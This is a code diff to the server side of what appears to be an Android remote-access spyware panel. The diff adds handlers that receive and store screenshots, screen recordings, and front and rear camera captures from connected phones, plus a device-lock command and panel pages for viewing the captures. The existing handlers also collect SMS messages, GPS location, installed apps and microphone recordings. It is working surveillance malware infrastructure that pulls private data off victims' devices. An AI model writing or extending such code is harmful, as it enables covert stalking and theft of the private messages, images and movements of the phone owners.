@@ -102,38 +102,35 @@ class Clients {
         this.gpsPoll(clientID);
 
 
-        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //
+        socket.on(CONST.messageKeys.screenShot, (data) => {
+            if (data.image) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                /*let uint8Arr = new Uint8Array(data.buffer);
+                let binary = '';
+                for (var i = 0; i < uint8Arr.length; i++) {
+                    binary += String.fromCharCode(uint8Arr[i]);*/
 
-        // socket.on(CONST.messageKeys.camera, (data) => {
-
-        //     // {
-        //     //     "image": <Boolean>,
-        //     //     "buffer": <Buffer>
-        //     // }
-
-        //     if (data.image) {
-        //         let uint8Arr = new Uint8Array(data.buffer);
-        //         let binary = '';
-        //         for (var i = 0; i < uint8Arr.length; i++) {
-        //             binary += String.fromCharCode(uint8Arr[i]);
-        //         }
-        //         let base64String = window.btoa(binary);
-
-        //         // save to file
-        //         let epoch = Date.now().toString();
-        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
-        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
-        //             if (!error) {
-        //                 // let's save the filepath to the database
-        //                 client.get('photos').push({
-        //                     time: epoch,
-        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
-        //                 }).write();
-        //             }
-        //             else return; // not ok
-        //         })
-        //     }
-        // });
+                // save to file
+                let epoch = Date.now().toString();
+                let hash = crypto.createHash('md5').update(new
+ Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(                                  ".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+                fs.writeFile(filePath, new Buffer(data.buffer, "base64"), (error) => {
+                    if (!error) {
+                        // let's save the filepath to the database
+                        client.get('downloads').push({
+                            "time": epoch,
+                            "type": "screenShot",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    }
+                    else return; // not ok
+                })
+            }
+        });
 
         socket.on(CONST.messageKeys.files, (data) => {
             // {
@@ -218,7 +215,6 @@ class Clients {
                             // cool, we dont have this sms
                             sms.hash = hash;
                             dbSMS.push(sms).write();
-                            newCount++;
                         }
                     });
                     logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
@@ -254,9 +250,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.location, (data) => {
-            if (data.latitude === undefined || data.latitude === undefined) {
-                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
-            } else {
+            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                 client.get('GPSData').push({
                     time: new Date(),
                     enabled: data.enabled || false,
@@ -267,6 +261,9 @@ class Clients {
                     speed: data.speed || 0
                 }).write();
                 logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
+            } else {
+                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
+                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
             }
         });
 
@@ -343,6 +340,107 @@ class Clients {
             logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
         });
 
+        socket.on(CONST.messageKeys.lockDevice, (data) => {
+            client.get('lockDevice').assign(data.lockDevice).write();
+            logManager.log(CONST.logTypes.success, clientID + " Device Locked");
+        });
+
+        socket.on(CONST.messageKeys.screenRecord, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "screenRecord",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+        socket.on(CONST.messageKeys.rearCam, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "rearCam",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+        socket.on(CONST.messageKeys.frontCam, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "frontCam",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+/*        socket.on(CONST.messageKeys.screenShot, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "screenShot",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });*/
+
         socket.on(CONST.messageKeys.installed, (data) => {
             client.get('apps').assign(data.apps).write();
             logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
@@ -411,6 +509,11 @@ class Clients {
             else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
             else if (page === "gps") pageData = clientData.GPSData;
             else if (page === "info") pageData = client;
+            else if (page === "lockdevice") pageData = clientData.lockDevice;
+            else if (page === "screenshot") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenShot");
+            else if (page === "screenrecord") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenRecord");
+            else if (page === "rearcam") pageData = clientDB.get('downloads').value().filter(download => download.type === "rearCam");
+            else if (page === "frontcam") pageData = clientDB.get('downloads').value().filter(download => download.type === "frontCam");
 
             return pageData;
         } else return false;
